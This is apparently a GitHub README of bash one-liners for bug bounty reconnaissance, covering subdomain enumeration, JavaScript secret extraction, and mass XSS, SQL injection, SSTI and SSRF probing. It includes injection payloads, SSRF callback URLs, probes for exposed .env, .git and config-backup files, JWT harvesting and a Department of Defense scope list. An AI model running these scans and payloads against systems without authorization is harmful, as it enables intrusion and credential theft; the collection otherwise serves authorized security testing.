<div align="center">

# KingOfBugBountyTips

<img src="https://media.giphy.com/media/26tn33aiTi1jkl6H6/giphy.gif" width="300" alt="Hacking Animation">

### The Ultimate Bug Bounty Reconnaissance Arsenal

<p>
  <img src="https://img.shields.io/badge/Bug%20Bounty-Hunter-red?style=for-the-badge&logo=hackerone">
  <img src="https://img.shields.io/badge/Recon-Methodology-blue?style=for-the-badge&logo=target">
  <img src="https://img.shields.io/badge/Oneliners-Collection-green?style=for-the-badge&logo=gnubash">
</p>

<img src="https://media.giphy.com/media/RDZo7znAdn2u7sAcWH/giphy.gif" width="400" alt="Cyber Security">

---

[![Telegram](https://img.shields.io/badge/Telegram-Join%20Group-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white)](https://t.me/joinchat/DN_iQksIuhyPKJL1gw0ttA)
[![Twitter](https://img.shields.io/badge/Twitter-@ofjaaah-1DA1F2?style=for-the-badge&logo=twitter&logoColor=white)](https://twitter.com/ofjaaah)
[![YouTube](https://img.shields.io/badge/YouTube-Subscribe-FF0000?style=for-the-badge&logo=youtube&logoColor=white)](https://www.youtube.com/c/OFJAAAH)
[![LinkedIn](https://img.shields.io/badge/LinkedIn-Connect-0077B5?style=for-the-badge&logo=linkedin&logoColor=white)](https://www.linkedin.com/in/atjunior/)

---

<img src="https://github-readme-stats.vercel.app/api?username=KingOfBugbounty&show_icons=true&theme=radical" alt="GitHub Stats">

</div>

---

## Department of Defense Bug Bounty Program

<div align="center">
<table>
<tr>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/United_States_Department_of_Defense_Seal.svg/200px-United_States_Department_of_Defense_Seal.svg.png" width="80"><br><b>DoD</b></td>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/69/Emblem_of_the_United_States_Department_of_the_Army.svg/200px-Emblem_of_the_United_States_Department_of_the_Army.svg.png" width="80"><br><b>Army</b></td>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e8/Seal_of_the_United_States_Department_of_the_Navy.svg/200px-Seal_of_the_United_States_Department_of_the_Navy.svg.png" width="80"><br><b>Navy</b></td>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/d/d9/Seal_of_the_U.S._Air_Force.svg/200px-Seal_of_the_U.S._Air_Force.svg.png" width="80"><br><b>Air Force</b></td>
<td align="center"><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/9b/Seal_of_the_United_States_Marine_Corps.svg/200px-Seal_of_the_United_States_Marine_Corps.svg.png" width="80"><br><b>Marines</b></td>
</tr>
</table>

<img src="https://media.giphy.com/media/077i6AULCXc0FKTj9s/giphy.gif" width="500" alt="Pentagon Security">

</div>

---

## About The Project

<img align="right" src="https://media.giphy.com/media/SWoSkN6DxTszqIKEqv/giphy.gif" width="300">

Our main goal is to share tips from well-known bug hunters. Using recon methodology, we find subdomains, APIs, and tokens that are exploitable.

**What you'll find here:**
- Curated oneliners for reconnaissance
- XSS, SQLi, SSRF, and more vulnerability detection
- Automation scripts
- DoD scope configurations
- Tool recommendations

<br clear="right"/>

---

## Table of Contents

<img align="right" src="https://media.giphy.com/media/l0IykDEpFyQeqyAeY/giphy.gif" width="200">

- [Quick Start](#-quick-start)
- [Required Tools](#-required-tools)
- [Subdomain Enumeration](#-subdomain-enumeration)
- [JavaScript Discovery](#-javascript-discovery)
- [XSS Detection](#-xss-detection)
- [SQL Injection](#-sql-injection)
- [SSRF Testing](#-ssrf-testing)
- [Web Crawling](#-web-crawling)
- [DoD Scope](#-dod-scope)
- [Automation Scripts](#-automation-scripts)
- [Bash Functions](#-bash-functions)
- [New Oneliners 2024-2025](#-new-oneliners-2024-2025)
- [Search Engines](#-search-engines-for-hackers)

<br clear="right"/>

---

## Quick Start

<div align="center">
<img src="https://media.giphy.com/media/3oKIPnAiaMCws8nOsE/giphy.gif" width="300" alt="Quick Start">
</div>

```bash
# Clone the repository
git clone https://github.com/KingOfBugbounty/KingOfBugBountyTips.git

# Basic recon automation
chaos -d $1 -o chaos1 -silent
assetfinder -subs-only $1 >> assetfinder1
subfinder -d $1 -o subfinder1 -silent
cat assetfinder1 subfinder1 chaos1 | anew hosts
httpx -l hosts -silent -threads 100 | anew alive_hosts
```

---

## Required Tools

<div align="center">
<img src="https://media.giphy.com/media/KzJkzjggfGN5Py6nkT/giphy.gif" width="300" alt="Tools">
</div>

<details>
<summary><b>Click to expand full tool list</b></summary>

### Core Reconnaissance Tools
| Tool | Description | Link |
|:----:|:-----------:|:----:|
| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Subfinder | Fast subdomain discovery | [GitHub](https://github.com/projectdiscovery/subfinder) |
| <img src="https://avatars.githubusercontent.com/u/6716868?s=30" width="20"> Amass | In-depth DNS enumeration | [GitHub](https://github.com/OWASP/Amass) |
| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Httpx | Fast HTTP toolkit | [GitHub](https://github.com/projectdiscovery/httpx) |
| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Nuclei | Vulnerability scanner | [GitHub](https://github.com/projectdiscovery/nuclei) |
| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Katana | Web crawler | [GitHub](https://github.com/projectdiscovery/katana) |
| <img src="https://avatars.githubusercontent.com/u/50994705?s=30" width="20"> Naabu | Port scanner | [GitHub](https://github.com/projectdiscovery/naabu) |

### Discovery & Collection Tools
| Tool | Description | Link |
|:----:|:-----------:|:----:|
| Gau | Fetch URLs from web archives | [GitHub](https://github.com/lc/gau) |
| Waybackurls | Fetch from Wayback Machine | [GitHub](https://github.com/tomnomnom/waybackurls) |
| Gospider | Web spider | [GitHub](https://github.com/jaeles-project/gospider) |
| Hakrawler | Web crawler | [GitHub](https://github.com/hakluke/hakrawler) |
| Paramspider | Parameter discovery | [GitHub](https://github.com/devanshbatham/ParamSpider) |

### Exploitation Tools
| Tool | Description | Link |
|:----:|:-----------:|:----:|
| Dalfox | XSS scanner | [GitHub](https://github.com/hahwul/dalfox) |
| SQLMap | SQL injection | [GitHub](https://github.com/sqlmapproject/sqlmap) |
| XSStrike | XSS detection | [GitHub](https://github.com/s0md3v/XSStrike) |
| Kxss | XSS parameter finder | [GitHub](https://github.com/Emoe/kxss) |

### Utility Tools
| Tool | Description | Link |
|:----:|:-----------:|:----:|
| Anew | Append unique lines | [GitHub](https://github.com/tomnomnom/anew) |
| Qsreplace | Query string replacer | [GitHub](https://github.com/tomnomnom/qsreplace) |
| Unfurl | URL parser | [GitHub](https://github.com/tomnomnom/unfurl) |
| Gf | Grep wrapper | [GitHub](https://github.com/tomnomnom/gf) |
| Ffuf | Web fuzzer | [GitHub](https://github.com/ffuf/ffuf) |

</details>

---

## Subdomain Enumeration

<div align="center">
<img src="https://media.giphy.com/media/xT9IgzoKnwFNmISR8I/giphy.gif" width="400" alt="Subdomain Hunting">
</div>

### Multi-source Subdomain Discovery
```bash
# Combine multiple sources for comprehensive enumeration
subfinder -d target.com -silent -all | anew subs.txt
amass enum -passive -d target.com | anew subs.txt
assetfinder -subs-only target.com | anew subs.txt
chaos -d target.com -silent | anew subs.txt
cat subs.txt | httpx -silent -threads 200 | anew alive.txt
```

### Certificate Transparency Enumeration
```bash
# Search via crt.sh API
curl -s "https://crt.sh/?q=%25.target.com&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u | httpx -silent
```

### JLDC Anubis API
```bash
# Fast subdomain discovery via Anubis
curl -s "https://jldc.me/anubis/subdomains/target.com" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
```

### ASN-based Discovery
```bash
# Find domains via ASN using metabigor
echo 'target_org' | metabigor net --org -v | awk '{print $3}' | sed 's/[[0-9]]\+\.//g' | xargs -I@ sh -c 'prips @ | hakrevdns | anew'
```

### Hurricane Electric DNS Extraction
```bash
# Extract domains from IP using HE
nslookup target.com | awk '/Address: / {print $2}' | hednsextractor -silent -only-domains | httpx -silent -title -tech-detect -status-code
```

### Shodan Domain Discovery
```bash
# Use Shodan for subdomain discovery
shodan domain target.com | awk '{print $3}' | httpx -silent | nuclei -t /nuclei-templates/
```

---

## JavaScript Discovery

<div align="center">
<img src="https://media.giphy.com/media/ln7z2eWriiQAllfVcn/giphy.gif" width="150" alt="JavaScript">
</div>

### Complete JS Recon Pipeline
```bash
# Comprehensive JS file discovery
subfinder -d target.com -silent -all | httpx -silent | katana -d 5 -silent -em js,jsp,json | anew js_files.txt
```

### Extract Secrets from JS
```bash
# Find subdomains and secrets with jsubfinder
cat subdomains.txt | httpx --silent | jsubfinder search -s
```

### Advanced JS Collection
```bash
# Multi-source JS collection with analysis
domain="target.com"
gau $domain | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> gauJS.txt
waybackurls $domain | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> wayJS.txt
gospider -a -s "https://$domain" -d 2 | grep -Eo "(http|https)://[^/\"].*\.js+" >> gospiderJS.txt
cat gauJS.txt wayJS.txt gospiderJS.txt | sort -u | httpx -silent | nuclei -t exposures/ -o js_vulns.txt
```

### Extract Paths from JS
```bash
# Extract internal paths from JavaScript files
cat file.js | grep -aoP "(?<=(\"|\'|\`))\/[a-zA-Z0-9_?&=\/\-\#\.]*(?=(\"|\'|\`))" | sort -u
```

---

## XSS Detection

<div align="center">
<img src="https://media.giphy.com/media/YQitE4YNQNahy/giphy.gif" width="300" alt="XSS">
</div>

### Dalfox Pipeline
```bash
# XSS scan with Dalfox
echo "target.com" | waybackurls | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | dalfox pipe --silence
```

### Airixss Quick Scan
```bash
# Fast XSS detection with Airixss
echo testphp.vulnweb.com | waybackurls | gf xss | uro | httpx -silent | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
```

### FREQ XSS Detection
```bash
# XSS testing with freq
echo target.com | waybackurls | gf xss | uro | qsreplace '"><img src=x onerror=alert(1);>' | freq | egrep -v 'Not'
```

### Bhedak Mass XSS
```bash
# Multi-payload XSS testing
cat urls.txt | bhedak "\"><svg/onload=alert(1)>*'/---+{{7*7}}"
```

### Knoxss API Integration
```bash
# Scan using Knoxss API
echo "target.com" | subfinder -silent | gau | grep "=" | uro | gf xss | awk '{ print "curl https://knoxss.me/api/v3 -d \"target="$1 "\" -H \"X-API-KEY: YOUR_API_KEY\""}' | sh
```

### Nuclei XSS Templates
```bash
# Use Nuclei XSS templates
cat urls.txt | httpx -silent | nuclei -t dast/vulnerabilities/xss/ -rl 50 -o xss_results.txt
```

### DOM XSS with Wingman
```bash
# Search for DOM XSS vulnerabilities
xargs -a domains.txt -I@ sh -c 'wingman -u @ --crawl | notify'
```

---

## SQL Injection

<div align="center">
<img src="https://media.giphy.com/media/MM0Jrc8BHKx3y/giphy.gif" width="300" alt="SQL Injection">
</div>

### SQLMap Mass Scan
```bash
# Mass SQL injection testing
httpx -l domains.txt -silent -threads 1000 | xargs -I@ sh -c 'findomain -t @ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli.txt'
sqlmap -m sqli.txt --batch --random-agent --level 1
```

### Quick SQLi Detection
```bash
# Fast SQL error detection
grep "=" urls.txt | qsreplace "' OR '1" | httpx -silent -store-response-dir output -threads 100
grep -q -rn "syntax\|mysql\|error" output 2>/dev/null && echo "[VULNERABLE]"
```

### GF + SQLMap Pipeline
```bash
# Targeted SQLi with gf patterns
cat urls.txt | gf sqli | qsreplace "1' AND '1'='1" | httpx -silent -mc 200 | anew sqli_candidates.txt
```

---

## SSRF Testing

<div align="center">
<img src="https://media.giphy.com/media/xUPGcEghH3lbcFDDGg/giphy.gif" width="300" alt="SSRF">
</div>

### Basic SSRF Discovery
```bash
# SSRF testing with Burp Collaborator
findomain -t target.com -q | httpx -silent -threads 1000 | gau | grep "=" | qsreplace http://YOUR.burpcollaborator.net
```

### Interactsh SSRF Testing
```bash
# SSRF with Interactsh
cat urls.txt | gf ssrf | qsreplace "https://YOUR_INTERACTSH_URL" | httpx -silent -mc 200
```

---

## SSTI Testing

### SSTI Payload Injection
```bash
# Test for SSTI vulnerabilities
cat subdomains.txt | httpx -silent -status-code | gau --threads 200 | qsreplace "{{7*7}}" > fuzzing.txt
ffuf -ac -u FUZZ -w fuzzing.txt -replay-proxy 127.0.0.1:8080 -mr "49"
```

---

## Web Crawling

<div align="center">
<img src="https://media.giphy.com/media/JIX9t2j0ZTN9S/giphy.gif" width="300" alt="Crawling">
</div>

### Katana Deep Crawling
```bash
# Katana with depth and JS extraction
subfinder -d target.com -silent -all | httpx -silent | katana -d 5 -silent | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)'
```

### Gospider Crawling
```bash
# Gospider with custom headers
chaos -d target.com -silent | httpx -silent | xargs -P100 -I@ gospider -c 30 -t 15 -d 4 -a -H "x-forwarded-for: 127.0.0.1" -H "User-Agent: Mozilla/5.0" -s @
```

### Hakrawler Spider
```bash
# Hakrawler with linkfinder
assetfinder -subs-only target.com -silent | httpx -timeout 3 -threads 300 --follow-redirects -silent | xargs -I% -P10 sh -c 'hakrawler -plain -linkfinder -depth 5 -url %'
```

### Cariddi Intensive Crawling
```bash
# Intensive crawling with Cariddi
echo target.com | subfinder -silent | httpx -silent | cariddi -intensive
```

---

## DoD Scope

<div align="center">

### BBRF Scope Configuration for Department of Defense

<table>
<tr>
<td><img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/e0/United_States_Department_of_Defense_Seal.svg/100px-United_States_Department_of_Defense_Seal.svg.png" width="60"></td>
<td>

```bash
bbrf inscope add \
  '*.af.mil' \
  '*.osd.mil' \
  '*.marines.mil' \
  '*.pentagon.mil' \
  '*.disa.mil' \
  '*.health.mil' \
  '*.dau.mil' \
  '*.dtra.mil' \
  '*.ng.mil' \
  '*.dds.mil' \
  '*.uscg.mil' \
  '*.army.mil' \
  '*.dcma.mil' \
  '*.dla.mil' \
  '*.dtic.mil' \
  '*.yellowribbon.mil' \
  '*.socom.mil'
```

</td>
</tr>
</table>

<img src="https://media.giphy.com/media/3o6ZsYm4U6T0R0YHVI/giphy.gif" width="400" alt="DoD Security">

</div>

---

## Automation Scripts

<div align="center">
<img src="https://media.giphy.com/media/PiQejEf31116URju4V/giphy.gif" width="300" alt="Automation">
</div>

### Full Recon Automation
```bash
#!/bin/bash
domain=$1

# Subdomain enumeration
chaos -d $domain -o chaos.txt -silent
assetfinder -subs-only $domain >> assetfinder.txt
subfinder -d $domain -o subfinder.txt -silent

# Merge and dedupe
cat chaos.txt assetfinder.txt subfinder.txt | anew all_subs.txt

# Probe alive hosts
httpx -l all_subs.txt -silent -threads 100 | anew alive.txt

# Port scanning
naabu -l alive.txt -p - -silent | anew ports.txt

# Vulnerability scanning
nuclei -l alive.txt -t /nuclei-templates/ -o vulns.txt

# Cleanup
rm -rf chaos.txt assetfinder.txt subfinder.txt
```

### XSS Mass Automation
```bash
#!/bin/bash
target=$1

# Collect URLs
waybackurls $target | anew urls.txt
gau $target | anew urls.txt

# Filter for XSS candidates
cat urls.txt | gf xss | uro | anew xss_urls.txt

# Test with multiple tools
cat xss_urls.txt | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | anew xss_found.txt
cat xss_urls.txt | dalfox pipe --silence | anew xss_found.txt
```

### Axiom Distributed Scan
```bash
# Distributed scanning with Axiom
findomain -t domain -q -u url
axiom-scan url -m subfinder -o subs --threads 3
axiom-scan subs -m httpx -o http
axiom-scan http -m ffuf --threads 15 -o ffuf-output
cat ffuf-output | tr "," " " | awk '{print $2}' | fff | grep 200 | sort -u
```

---

## Bash Functions

<div align="center">
<img src="https://media.giphy.com/media/f3iwJFOVOwuy7K6FFw/giphy.gif" width="300" alt="Bash">
</div>

Add these functions to your `.bashrc` or `.zshrc`:

```bash
# Quick subdomain recon
recon() {
    subfinder -d $1 -silent | anew subs.txt
    assetfinder -subs-only $1 | anew subs.txt
    cat subs.txt | httpx -silent | anew alive.txt
}

# JavaScript recon
reconjs() {
    gau -subs $1 | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> js.txt
    cat js.txt | anti-burl | awk '{print $4}' | sort -u >> AliveJs.txt
}

# Certificate transparency search
cert() {
    curl -s "https://crt.sh/?q=%25.$1&output=json" | jq -r '.[].name_value' | sed 's/\*\.//g' | anew
}

# Anubis subdomain search
anubis() {
    curl -s "https://jldc.me/anubis/subdomains/$1" | grep -Po "((http|https):\/\/)?(([\w.-]*)\.([\w]*)\.([A-z]))\w+" | anew
}

# Quick XSS scan
quickxss() {
    echo $1 | waybackurls | gf xss | uro | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)"
}

# Nuclei quick scan
nucleiscan() {
    echo $1 | httpx -silent | nuclei -t /nuclei-templates/ -severity critical,high -o results.txt
}

# Full recon pipeline
fullrecon() {
    subfinder -d $1 -silent | anew subs.txt
    cat subs.txt | httpx -silent | anew alive.txt
    cat alive.txt | katana -d 3 -silent | anew crawl.txt
    cat crawl.txt | gf xss | anew xss.txt
    cat crawl.txt | gf sqli | anew sqli.txt
}
```

---

## New Oneliners 2024-2025

<div align="center">
<img src="https://media.giphy.com/media/3o7TKMt1VVNkHV2PaE/giphy.gif" width="400" alt="New Features">
</div>

### Nuclei DAST Scanning
```bash
# Dynamic Application Security Testing with Nuclei
cat urls.txt | httpx -silent | nuclei -dast -rl 10 -c 5 -o dast_results.txt
```

### Notify Integration
```bash
# Get notifications for findings
nuclei -l targets.txt -t /nuclei-templates/ -severity critical | notify -silent
```

### Interactsh OOB Detection
```bash
# Out-of-band vulnerability detection
cat urls.txt | qsreplace "https://YOUR_INTERACTSH.oast.fun" | httpx -silent
```

### CVE-specific Scanning
```bash
# Scan for specific CVEs
nuclei -l targets.txt -t cves/2024/ -o cve_2024_results.txt
```

### API Endpoint Discovery
```bash
# Find API endpoints
cat js_files.txt | xargs -I@ sh -c 'curl -s @ | grep -oE "/api/[a-zA-Z0-9/_-]+"' | sort -u | anew api_endpoints.txt
```

### GraphQL Introspection
```bash
# Test for GraphQL introspection
cat urls.txt | httpx -silent -path /graphql -mc 200 | nuclei -t graphql/ -o graphql_vulns.txt
```

### Swagger/OpenAPI Discovery
```bash
# Find exposed API documentation
cat urls.txt | httpx -silent -path /swagger.json,/openapi.json,/api-docs -mc 200 | anew swagger_exposed.txt
```

### JWT Testing
```bash
# Collect and analyze JWTs
cat urls.txt | httpx -silent | katana -d 2 -silent | grep -oE "eyJ[A-Za-z0-9_-]*\.eyJ[A-Za-z0-9_-]*\.[A-Za-z0-9_-]*" | anew jwts.txt
```

### Subdomain Takeover
```bash
# Check for subdomain takeover
subfinder -d target.com -silent | httpx -silent | nuclei -t takeovers/ -o takeover_vulns.txt
```

### Sensitive File Discovery
```bash
# Find exposed sensitive files
cat urls.txt | httpx -silent -path /.env,/.git/config,/config.php,/wp-config.php.bak -mc 200 | anew sensitive_files.txt
```

### Mass Screenshot
```bash
# Screenshot all alive hosts
cat alive.txt | gowitness file -f - -P screenshots/
```

### Xray Vulnerability Scanner
```bash
# Web vulnerability scanning with Xray
xargs -a urls.txt -I@ sh -c './xray webscan --plugins cmd-injection,sqldet,xss --url "@" --html-output vuln.html'
```

### Log4j Scanning with BBRF
```bash
# Log4j vulnerability assessment
bbrf domains | httpx -silent | xargs -I@ sh -c 'python3 log4j-scan.py -u "@"'
```

### Git Exposure Mass Check
```bash
# Mass hunt exposed .git directories
hednsextractor -target "your target" -silent | httpx -path /.git/config -status-code -ms 200 -silent
```

### Hudson Rock Threat Intel
```bash
# Search for compromised credentials
curl "https://cavalier.hudsonrock.com/api/json/v2/osint-tools/search-by-domain?domain=target.com"
```

---

## Search Engines for Hackers

<div align="center">
<img src="https://media.giphy.com/media/vISmwpBJUNYzukTnVx/giphy.gif" width="300" alt="Search">
</div>

| Engine | Description | Link |
|:------:|:-----------:|:----:|
| Shodan | IoT search engine | [shodan.io](https://shodan.io) |
| Censys | Internet-wide scanning | [censys.io](https://censys.io) |
| Fofa | Chinese security search | [en.fofa.info](https://en.fofa.info) |
| ZoomEye | Cyberspace search | [zoomeye.org](https://zoomeye.org) |
| Onyphe | Cyber defense search | [onyphe.io](https://onyphe.io) |
| GreyNoise | Internet scanner detection | [viz.greynoise.io](https://viz.greynoise.io) |
| CriminalIP | Threat intelligence | [criminalip.io](https://www.criminalip.io) |
| Netlas | Attack surface discovery | [netlas.io](https://netlas.io) |
| Hunter | Email discovery | [hunter.io](https://hunter.io) |
| Intelx | Intelligence search | [intelx.io](https://intelx.io) |
| Pulsedive | Threat intelligence | [pulsedive.com](https://pulsedive.com) |
| DNSDumpster | DNS recon | [dnsdumpster.com](https://dnsdumpster.com) |
| crt.sh | Certificate search | [crt.sh](https://crt.sh) |
| PhoneBook | Domain/email search | [phonebook.cz](https://phonebook.cz) |
| LeakRadar | Leak detection | [leakradar.io](https://leakradar.io) |
| SubdomainRadar | Subdomain monitoring | [subdomainradar.io](https://subdomainradar.io) |
| Hudson Rock | Cybercrime intelligence | [hudsonrock.com](https://www.hudsonrock.com/threat-intelligence-cybercrime-tools) |

---

## Special Thanks

<div align="center">

| Hunter | Twitter |
|:------:|:-------:|
| bt0s3c | [@bt0s3c](https://twitter.com/bt0s3c) |
| Stok | [@stokfredrik](https://twitter.com/stokfredrik) |
| Jhaddix | [@Jhaddix](https://twitter.com/Jhaddix) |
| TomNomNom | [@TomNomNom](https://twitter.com/TomNomNom) |
| Jeff Foley | [@jeff_foley](https://twitter.com/jeff_foley) |
| NahamSec | [@NahamSec](https://twitter.com/NahamSec) |
| zseano | [@zseano](https://twitter.com/zseano) |
| pry0cc | [@pry0cc](https://twitter.com/pry0cc) |
| pdiscoveryio | [@pdiscoveryio](https://twitter.com/pdiscoveryio) |

</div>

---

<div align="center">

## Download BugBuntu

[![BugBuntu](https://img.shields.io/badge/Download-BugBuntu-orange?style=for-the-badge&logo=linux)](https://sourceforge.net/projects/bugbuntu/)

<img src="https://media.giphy.com/media/du3J3cXyzhj75IOgvA/giphy.gif" width="300" alt="Linux">

---

<a href="https://www.buymeacoffee.com/OFJAAAH"><img src="https://www.buymeacoffee.com/assets/img/custom_images/orange_img.png" alt="Buy Me A Coffee" width="200"></a>

---

<p>
  <img src="https://img.shields.io/badge/Made%20with-Bash-1f425f.svg?style=for-the-badge">
  <img src="https://img.shields.io/badge/Made%20with-Go-00ADD8.svg?style=for-the-badge&logo=go">
  <img src="https://img.shields.io/badge/Open%20Source-Yes!-green?style=for-the-badge&logo=github">
</p>

**Disclaimer:** These tools and techniques are for authorized security testing only. Always obtain proper authorization before testing.

<img src="https://media.giphy.com/media/3o7aCSPqXE5C6T8tBC/giphy.gif" width="300" alt="Security">

</div>
